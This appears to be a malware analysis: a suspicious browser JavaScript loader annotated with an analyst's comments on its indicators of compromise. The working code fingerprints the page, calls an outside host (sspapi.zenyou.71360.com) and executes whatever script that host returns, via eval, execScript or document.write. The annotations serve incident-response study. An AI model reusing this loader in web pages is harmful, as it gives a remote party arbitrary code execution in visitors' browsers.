/**
 * This is suspicious. I’m not sure exactly what is included in the
 * second-to-last script block, but my guess would be some form of unique
 * identifier that could be used to distinguish this target from another. It is
 * expected to be in the form of 2 – 3 elements separated by a “-” and enclosed
 * in HTML comment tags. They may be used as inputs to the payload generated by
 * the remote server, but that can’t be proven with the available information.
 * Looking for the second to last element of the scripts array is unique enough
 * behavour to be used as an IoC to identify this specific script.
 */
var par = document.scripts[document.scripts.length - 2].text;
par = par.replace('<!--', '');
par = par.replace('-->', '');
par = par.split("-");
var i = par[0];
var o = par[1];
var u = par[2];

function zdRndNum(n) {
  var rnd = "";
  for (var i = 0; i < n; i++)
    rnd += Math.floor(Math.random() * 10);
  return rnd;
}

function isIE() {
  if (!!window.ActiveXObject || "ActiveXObject" in window)
    return true;
  else
    return false;
}

/*
 * URLs are a common IoC. The query parameters are useful to track what browser
 * is executing this script, and can be used in putting together a timeline
 * during an incident response investigation. The generated 10-digit random
 * number could be used to distinguish separate instances of the script being
 * executed by the same browser and therefore is a useful IoC to track
 * individual executions.
 */
var zdrandomnum = zdRndNum(10);
if (u) {
  var url = "//sspapi.zenyou.71360.com/js?i=" + i + "&o=" + o + "&u=" + u +
    "&ran=" + zdrandomnum;
} else {
  var url = "//sspapi.zenyou.71360.com/js?i=" + i + "&o=" + o + "&ran=" +
    zdrandomnum;
}

var isie = isIE();
if (isie) {
  /*
   * Internet Explorer always needs special handling. The function used later on
   * (window.execScript) was originally a feature of IE that was ported to
   * Chrome for compatibility, but the script doesn’t trust that IE will have
   * it, so it changes the DOM using `document.write` to contain only the script
   * block. After the DOM is modified, the inserted HTML will be parsed
   * immediately, which will result in the <script> blocks retrieving the remote
   * script from the URL to be executed.
   */
  document.write("<script src =" + url + "></script>");
} else {
  /*
   * Sending and receiving data to an external site is a common JavaScript
   * function, so it's not an IoC in and of itself. However, this can
   * functionality is also common in malware and can be used in support of
   * other IoCs.
   */
  var xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function() {
    var XMLHttpReq = xhr;
    if (XMLHttpReq.readyState == 4) {
      if (XMLHttpReq.status == 200) {
        var text = XMLHttpReq.responseText;
        /*
         * window.execScript and window.eval are two of the key IoCs from this
	 * script. Any use of these functions in client-side JavaScript is worth
	 * investigating, even if just to tune out.
         */
        if (window.execScript) {
          window.execScript(text);
        } else {
          window.eval(text);
        }
      }
    }
  }
};
xhr.send(null);
